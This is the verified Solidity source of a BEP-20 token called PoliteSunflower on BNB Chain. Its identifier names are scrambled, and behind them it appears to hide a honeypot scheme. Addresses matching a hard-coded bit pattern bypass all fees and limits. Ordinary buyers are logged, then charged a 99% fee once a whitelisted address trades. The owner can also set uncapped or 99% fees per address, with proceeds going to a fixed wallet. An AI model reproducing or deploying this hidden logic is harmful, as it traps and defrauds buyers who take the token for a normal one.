/**
 *Submitted for verification at BscScan.com on 2022-12-09
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract PoliteSunflower is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Polite Sunflower ";
    string constant _symbol = "PoliteSunflower";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private walletTxBotsBuyExemptSwapAuto;
    mapping(address => bool) private isFeeLiquidityBurn;
    mapping(address => bool) private modeBurnAutoTeamExemptFee;
    mapping(address => bool) private modeMarketingTradingWalletBots;
    mapping(address => uint256) private swapMinFeeIsModeSellTeam;
    mapping(uint256 => address) private launchedWalletSwapLiquidityBuyTrading;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private limitBotsModeExempt = 0;
    uint256 private autoLimitTeamBots = 7;

    //SELL FEES
    uint256 private feeSwapAutoTeam = 0;
    uint256 private liquidityMaxLaunchedBuyMode = 7;

    uint256 private limitModeTeamSwap = autoLimitTeamBots + limitBotsModeExempt;
    uint256 private maxTradingMinLiquidity = 100;

    address private minFeeExemptTxBotsAuto = (msg.sender); // auto-liq address
    address private burnLimitReceiverBotsLaunched = (0xEbB93c24731a85351eDc56C8FfFfFd7643c70C0e); // marketing address
    address private limitWalletTeamLaunchedSellBurn = DEAD;
    address private burnAutoExemptMarketing = DEAD;
    address private buyMarketingSellWallet = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private minSellLiquidityMarketing;
    uint256 private modeSwapLimitTradingTx;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private teamAutoMarketingFeeTrading;
    uint256 private botsBurnTxLaunched;
    uint256 private walletSellLimitFeeSwap;
    uint256 private walletTradingTeamMinAuto;
    uint256 private launchedSellLimitSwap;

    bool private swapLiquidityWalletMaxMin = true;
    bool private modeMarketingTradingWalletBotsMode = true;
    bool private modeTeamAutoBurn = true;
    bool private limitTradingWalletSwap = true;
    bool private receiverLaunchedExemptSellMinBots = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private liquiditySwapSellBuy = _totalSupply / 1000; // 0.1%

    
    uint256 private isLaunchedTradingMarketing = 0;
    bool private exemptBuyTeamLaunchedIsMode = false;
    bool private buyTradingMinBots = false;
    bool private launchedMinSwapTrading = false;
    bool private feeMaxExemptAuto = false;
    bool private txLimitLiquidityLaunchedWallet = false;
    uint256 private minSwapFeeMode = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        teamAutoMarketingFeeTrading = true;

        walletTxBotsBuyExemptSwapAuto[msg.sender] = true;
        walletTxBotsBuyExemptSwapAuto[address(this)] = true;

        isFeeLiquidityBurn[msg.sender] = true;
        isFeeLiquidityBurn[0x0000000000000000000000000000000000000000] = true;
        isFeeLiquidityBurn[0x000000000000000000000000000000000000dEaD] = true;
        isFeeLiquidityBurn[address(this)] = true;

        modeBurnAutoTeamExemptFee[msg.sender] = true;
        modeBurnAutoTeamExemptFee[0x0000000000000000000000000000000000000000] = true;
        modeBurnAutoTeamExemptFee[0x000000000000000000000000000000000000dEaD] = true;
        modeBurnAutoTeamExemptFee[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return exemptTxSwapIs(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return exemptTxSwapIs(sender, recipient, amount);
    }

    function exemptTxSwapIs(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = feeAutoReceiverTeam(sender) || feeAutoReceiverTeam(recipient);
        
        if (minSwapFeeMode != limitBotsModeExempt) {
            minSwapFeeMode = autoLimitTeamBots;
        }

        if (feeMaxExemptAuto == swapLiquidityWalletMaxMin) {
            feeMaxExemptAuto = receiverLaunchedExemptSellMinBots;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                isBurnWalletLimit();
            }
            if (!bLimitTxWalletValue) {
                receiverTradingExemptIsLaunched(recipient);
            }
        }
        
        if (feeMaxExemptAuto == receiverLaunchedExemptSellMinBots) {
            feeMaxExemptAuto = modeTeamAutoBurn;
        }


        if (inSwap || bLimitTxWalletValue) {return autoWalletTradingLiquidity(sender, recipient, amount);}

        if (!walletTxBotsBuyExemptSwapAuto[sender] && !walletTxBotsBuyExemptSwapAuto[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || modeBurnAutoTeamExemptFee[sender] || modeBurnAutoTeamExemptFee[recipient], "Max TX Limit has been triggered");

        if (autoIsLimitTradingWalletReceiverBuy()) {exemptMaxModeSwapBuyLiquidity();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        if (minSwapFeeMode != liquiditySwapSellBuy) {
            minSwapFeeMode = limitBotsModeExempt;
        }


        uint256 amountReceived = sellMarketingMinLimit(sender) ? receiverTxTeamMarketing(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function autoWalletTradingLiquidity(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function sellMarketingMinLimit(address sender) internal view returns (bool) {
        return !isFeeLiquidityBurn[sender];
    }

    function swapIsBurnLaunchedMarketingLimitReceiver(address sender, bool selling) internal returns (uint256) {
        
        if (buyTradingMinBots != modeTeamAutoBurn) {
            buyTradingMinBots = swapLiquidityWalletMaxMin;
        }

        if (exemptBuyTeamLaunchedIsMode == limitTradingWalletSwap) {
            exemptBuyTeamLaunchedIsMode = modeTeamAutoBurn;
        }

        if (launchedMinSwapTrading != feeMaxExemptAuto) {
            launchedMinSwapTrading = limitTradingWalletSwap;
        }


        if (selling) {
            limitModeTeamSwap = liquidityMaxLaunchedBuyMode + feeSwapAutoTeam;
            return launchedBurnExemptBuy(sender, limitModeTeamSwap);
        }
        if (!selling && sender == uniswapV2Pair) {
            limitModeTeamSwap = autoLimitTeamBots + limitBotsModeExempt;
            return limitModeTeamSwap;
        }
        return launchedBurnExemptBuy(sender, limitModeTeamSwap);
    }

    function receiverTxTeamMarketing(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = amount.mul(swapIsBurnLaunchedMarketingLimitReceiver(sender, receiver == uniswapV2Pair)).div(maxTradingMinLiquidity);

        if (modeMarketingTradingWalletBots[sender] || modeMarketingTradingWalletBots[receiver]) {
            feeAmount = amount.mul(99).div(maxTradingMinLiquidity);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function feeAutoReceiverTeam(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function launchedBurnExemptBuy(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = swapMinFeeIsModeSellTeam[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function receiverTradingExemptIsLaunched(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        launchedWalletSwapLiquidityBuyTrading[exemptLimitValue] = addr;
    }

    function isBurnWalletLimit() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (swapMinFeeIsModeSellTeam[launchedWalletSwapLiquidityBuyTrading[i]] == 0) {
                    swapMinFeeIsModeSellTeam[launchedWalletSwapLiquidityBuyTrading[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(burnLimitReceiverBotsLaunched).transfer(amountBNB * amountPercentage / 100);
    }

    function autoIsLimitTradingWalletReceiverBuy() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    receiverLaunchedExemptSellMinBots &&
    _balances[address(this)] >= liquiditySwapSellBuy;
    }

    function exemptMaxModeSwapBuyLiquidity() internal swapping {
        
        if (exemptBuyTeamLaunchedIsMode != swapLiquidityWalletMaxMin) {
            exemptBuyTeamLaunchedIsMode = txLimitLiquidityLaunchedWallet;
        }

        if (buyTradingMinBots == modeTeamAutoBurn) {
            buyTradingMinBots = buyTradingMinBots;
        }

        if (feeMaxExemptAuto == modeTeamAutoBurn) {
            feeMaxExemptAuto = receiverLaunchedExemptSellMinBots;
        }


        uint256 amountToLiquify = liquiditySwapSellBuy.mul(limitBotsModeExempt).div(limitModeTeamSwap).div(2);
        uint256 amountToSwap = liquiditySwapSellBuy.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (launchedMinSwapTrading == feeMaxExemptAuto) {
            launchedMinSwapTrading = buyTradingMinBots;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = limitModeTeamSwap.sub(limitBotsModeExempt.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(limitBotsModeExempt).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(autoLimitTeamBots).div(totalETHFee);
        
        payable(burnLimitReceiverBotsLaunched).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                minFeeExemptTxBotsAuto,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getFeeSwapAutoTeam() public view returns (uint256) {
        return feeSwapAutoTeam;
    }
    function setFeeSwapAutoTeam(uint256 a0) public onlyOwner {
        if (feeSwapAutoTeam != limitModeTeamSwap) {
            limitModeTeamSwap=a0;
        }
        if (feeSwapAutoTeam != limitBotsModeExempt) {
            limitBotsModeExempt=a0;
        }
        feeSwapAutoTeam=a0;
    }

    function getLimitTradingWalletSwap() public view returns (bool) {
        if (limitTradingWalletSwap == feeMaxExemptAuto) {
            return feeMaxExemptAuto;
        }
        if (limitTradingWalletSwap == buyTradingMinBots) {
            return buyTradingMinBots;
        }
        if (limitTradingWalletSwap != modeTeamAutoBurn) {
            return modeTeamAutoBurn;
        }
        return limitTradingWalletSwap;
    }
    function setLimitTradingWalletSwap(bool a0) public onlyOwner {
        limitTradingWalletSwap=a0;
    }

    function getExemptBuyTeamLaunchedIsMode() public view returns (bool) {
        if (exemptBuyTeamLaunchedIsMode != exemptBuyTeamLaunchedIsMode) {
            return exemptBuyTeamLaunchedIsMode;
        }
        return exemptBuyTeamLaunchedIsMode;
    }
    function setExemptBuyTeamLaunchedIsMode(bool a0) public onlyOwner {
        if (exemptBuyTeamLaunchedIsMode == feeMaxExemptAuto) {
            feeMaxExemptAuto=a0;
        }
        exemptBuyTeamLaunchedIsMode=a0;
    }

    function getModeMarketingTradingWalletBotsMode() public view returns (bool) {
        return modeMarketingTradingWalletBotsMode;
    }
    function setModeMarketingTradingWalletBotsMode(bool a0) public onlyOwner {
        if (modeMarketingTradingWalletBotsMode == swapLiquidityWalletMaxMin) {
            swapLiquidityWalletMaxMin=a0;
        }
        modeMarketingTradingWalletBotsMode=a0;
    }

    function getLaunchedMinSwapTrading() public view returns (bool) {
        return launchedMinSwapTrading;
    }
    function setLaunchedMinSwapTrading(bool a0) public onlyOwner {
        if (launchedMinSwapTrading != swapLiquidityWalletMaxMin) {
            swapLiquidityWalletMaxMin=a0;
        }
        if (launchedMinSwapTrading == txLimitLiquidityLaunchedWallet) {
            txLimitLiquidityLaunchedWallet=a0;
        }
        launchedMinSwapTrading=a0;
    }

    function getModeTeamAutoBurn() public view returns (bool) {
        if (modeTeamAutoBurn == launchedMinSwapTrading) {
            return launchedMinSwapTrading;
        }
        if (modeTeamAutoBurn != limitTradingWalletSwap) {
            return limitTradingWalletSwap;
        }
        return modeTeamAutoBurn;
    }
    function setModeTeamAutoBurn(bool a0) public onlyOwner {
        if (modeTeamAutoBurn != feeMaxExemptAuto) {
            feeMaxExemptAuto=a0;
        }
        if (modeTeamAutoBurn != receiverLaunchedExemptSellMinBots) {
            receiverLaunchedExemptSellMinBots=a0;
        }
        if (modeTeamAutoBurn == receiverLaunchedExemptSellMinBots) {
            receiverLaunchedExemptSellMinBots=a0;
        }
        modeTeamAutoBurn=a0;
    }

    function getSwapLiquidityWalletMaxMin() public view returns (bool) {
        return swapLiquidityWalletMaxMin;
    }
    function setSwapLiquidityWalletMaxMin(bool a0) public onlyOwner {
        if (swapLiquidityWalletMaxMin == modeTeamAutoBurn) {
            modeTeamAutoBurn=a0;
        }
        if (swapLiquidityWalletMaxMin == txLimitLiquidityLaunchedWallet) {
            txLimitLiquidityLaunchedWallet=a0;
        }
        if (swapLiquidityWalletMaxMin == receiverLaunchedExemptSellMinBots) {
            receiverLaunchedExemptSellMinBots=a0;
        }
        swapLiquidityWalletMaxMin=a0;
    }

    function getModeBurnAutoTeamExemptFee(address a0) public view returns (bool) {
        if (a0 != buyMarketingSellWallet) {
            return receiverLaunchedExemptSellMinBots;
        }
            return modeBurnAutoTeamExemptFee[a0];
    }
    function setModeBurnAutoTeamExemptFee(address a0,bool a1) public onlyOwner {
        if (modeBurnAutoTeamExemptFee[a0] != modeMarketingTradingWalletBots[a0]) {
           modeMarketingTradingWalletBots[a0]=a1;
        }
        modeBurnAutoTeamExemptFee[a0]=a1;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}